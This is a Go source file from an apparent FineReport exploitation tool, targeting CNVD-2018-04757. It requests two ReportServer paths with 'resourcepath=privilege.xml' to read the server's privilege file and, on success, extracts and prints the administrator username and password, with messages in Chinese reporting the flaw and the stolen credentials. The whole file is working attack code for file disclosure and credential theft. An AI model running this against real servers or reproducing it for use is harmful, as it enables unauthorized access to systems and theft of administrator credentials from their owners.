package CNVD201804757

import (
	"FineReportExploit/utils"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

func CNVD201804757(url string) {
	url = utils.FixUrl(url)
	dir1 := "/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
	dir2 := "/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
	flag := Read(url, dir1)
	if !flag {
		flag2 := Read(url, dir2)
		if flag2 == false {
			fmt.Println("====================")
			fmt.Println("不存在漏洞：CNVD201804757")
			fmt.Println("====================")
			return
		}
	} else {
		return
	}

}
func Read(url string, dir string) bool {
	resp, err := http.Get(url + dir)
	if err != nil {
		recover()
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
	}
	body_str := string(body)
	if strings.Contains(body_str, "rootManagerName") {
		fmt.Println("====================")
		fmt.Println("存在漏洞：CNVD201804757")
		fmt.Println("读取密码文件privilege.xml成功")
		User, Pass := GetUserAndPass(body_str)
		fmt.Println("用户名：" + User)
		fmt.Println("密码：" + Pass)
		fmt.Println("====================")
		return true
	}
	return false
}
